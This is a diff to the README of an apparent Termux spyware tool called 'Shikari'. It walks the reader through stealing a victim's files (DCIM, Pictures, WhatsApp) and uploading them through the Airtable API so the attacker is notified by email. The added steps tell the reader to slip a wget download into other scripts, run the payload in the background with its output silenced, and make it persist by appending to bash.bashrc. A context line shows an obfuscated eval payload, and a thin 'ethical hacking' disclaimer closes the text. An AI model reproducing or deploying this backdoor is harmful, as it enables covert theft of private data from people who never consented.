@@ -11,13 +11,16 @@
 
 ## Features
 
-You can get any files of victim 🌚</br>
+✓ First time on internet 😎 , Give credit if you are going to copy my code.</br>
+✓ You can get any files of victim 🌚</br>
 - /storage/DCIM
 - /storage/Pictures
 - /storage/WhatsApp 
 - /storage/Anything..;)
 
-All things happen in background, not easily detectable ;)
+✓ All things happen in background.</br>
+✓ Not Easily Detectable</br>
+✓ You will get notifications through Email ;)</br>
 
 ## Tutorial
 ### Step 1
@@ -57,13 +60,80 @@ eval "$Az$Bz$Cz$Dz$z$Az$Ez$Fz$Gz$z$Hz$Iz$z$Jz$z$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$Tz$
 
 + Add your API id, base id and table id without space.
 + Enter your folder name you want to Hack. (ex. DCIM, Pictures, Download, Music)
-
++ Then save it "shikari.sh" and upload on your GitHub account.
 ### Step 5
 
-+ Upload this script on GitHub.
-+ Download it through wget command.
++ Now you can download "shikari.sh" script on victim device by wget command.
++ You can add this command in any script.
 
+Example.,
+```
+wget https://raw.githubusercontent.com/.../../master/shikari.sh
+```
 
-### Tutorials
+### Background Process
++ Add this code in your new hack.sh script for background process.
+```
+_evalBg() {
+eval "$@" &>/dev/null & disown;
+}
+cmd="bash shikari.sh";
+_evalBg "${cmd}";
+```
+### logic
+When someone open termux everytime you will get /storage/folder of victim.
++ You need to follow this step..(add below code in your Bash script)
+```
+mv hack.sh $PREFIX/etc/bin 
+echo "bash hack.sh" >> $PREFIX/etc/bash.bashrc
+```
 
-- [S!M Hunter Tutorial](https://bhai4you.blogspot.com/2022/03/sim-hunter-sim-information-gathering.html?m=1)
+### Limitation
++ You can't get any folder if your victim have no storage permission on Termux.
++ add this command in your script for Storage permission.
+```
+termux-setup-storage
+```
+
+### Email Setup
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203554.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203648.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203715.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203743.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203810.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-204013.jpg"></a>
+
++ Setup according your need , when someone use your script then automatically backdoor
+Created on victim device, everytime your victim open termux you will get his data through Email !!
++ After uploading folders, airtable will send you download link ;)
+
+### Demo Screenshots
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205246_105.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205251_263__01.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205256_944__01.jpg"></a>
+<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205300_548.jpg"></a>
+
+### How it works ??
++ Shikari is API based tool 🦴
+
+```
+curl -v -X POST https://api.airtable.com/v0/#baseid/#tablename \
+  -H "Authorization: Bearer #apikey" \
+  -H "Content-Type: application/json" \
+  --data '{
+  "records": [
+    {
+      "fields": {
+        "Name": "#toolname",
+        "link": "https://bhai4you.blogspot.com"
+      }
+    }
+  ]
+}'
+```
+✓ All files uploaded through Airtable API
+✓ Change #baseid, #apikey, #tablename, #toolname and save it demo.sh
+✓ bash demo.sh [for testing]
+### Disclaimer
+The tutorial and demo provided for informational and educational purpose only, and for those who’re willing and curious to know and learn about Ethical Hacking, Security and Penetration Testing.</br></br> Any time the word “Hacking” that is used on this Application shall be regarded as Ethical Hacking.</br></br>
+You shall not misuse the information to gain unauthorised access. However you may try out these hacks on your own computer at your own risk. Performing hack attempts (without permission) on computers that you do not own is illegal.
